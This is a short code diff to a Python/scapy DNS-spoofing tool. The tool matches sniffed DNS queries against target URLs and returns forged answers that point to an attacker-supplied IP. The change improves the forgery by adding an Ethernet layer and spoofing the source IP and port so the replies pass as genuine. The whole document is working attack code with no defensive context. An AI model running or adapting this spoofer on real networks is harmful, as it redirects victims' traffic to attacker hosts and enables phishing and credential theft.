@@ -1,4 +1,5 @@
 import packet_sniffer
+from scapy.all import *
 
 class DnsSpoofArgs:
     def __init__(self, urls, redirect_ip):
@@ -11,7 +12,7 @@ def check_packet(pkt, args: DnsSpoofArgs):
         for url in args.urls:
             if url in str(pkt["DNS Question Record"].qname):
                 print("[+] DNS Spoofing: {}".format(pkt["DNS Question Record"].qname))
-                spf_resp =  IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=args.redirect_ip)/DNSRR(rrname=pkt[DNSQR].qname,rdata=args.redirect_ip))
+                spf_resp =  Ether()/IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=args.redirect_ip)/DNSRR(rrname=pkt[DNSQR].qname,rdata=args.redirect_ip))
 
                 return spf_resp
 
